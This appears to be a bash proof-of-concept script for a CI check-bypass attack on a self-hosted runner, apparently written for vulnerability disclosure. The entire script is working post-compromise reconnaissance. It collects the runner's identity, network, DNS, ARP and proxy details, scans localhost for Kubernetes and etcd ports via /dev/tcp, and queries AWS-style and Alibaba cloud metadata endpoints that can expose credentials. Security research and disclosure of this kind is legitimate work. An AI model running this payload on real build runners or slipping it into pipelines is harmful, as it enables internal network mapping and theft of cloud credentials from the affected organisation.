#!/bin/bash
echo "=== PoC #2: Distribute CI Check-Bypass (PaddleNLP Pattern) ==="
echo "[*] Simulating: check-bypass label bypass → auto-execute on self-hosted runner"
echo ""
echo "[+] Runner identity:"
whoami && hostname && id
echo ""
echo "[+] Network configuration:"
ip addr show 2>/dev/null | grep -E "inet |link/" || ifconfig 2>/dev/null
echo ""
echo "[+] Internal network probe:"
echo "  - Gateway:"
ip route show default 2>/dev/null
echo "  - DNS:"
cat /etc/resolv.conf 2>/dev/null | grep nameserver
echo "  - ARP neighbors:"
ip neigh show 2>/dev/null | head -10
echo ""
echo "[+] HTTP proxy settings:"
env | grep -i proxy || echo "  (none)"
echo ""
echo "[+] Internal service scan (common ports):"
for port in 80 443 8080 6443 10250 10255 2379; do
  timeout 2 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "  localhost:$port OPEN" || true
done
echo ""
echo "[+] Cloud metadata (SSRF test):"
curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -20
curl -s --max-time 3 http://100.100.100.200/latest/meta-data/ 2>/dev/null | head -20
echo ""
echo "=== End PoC #2 ==="
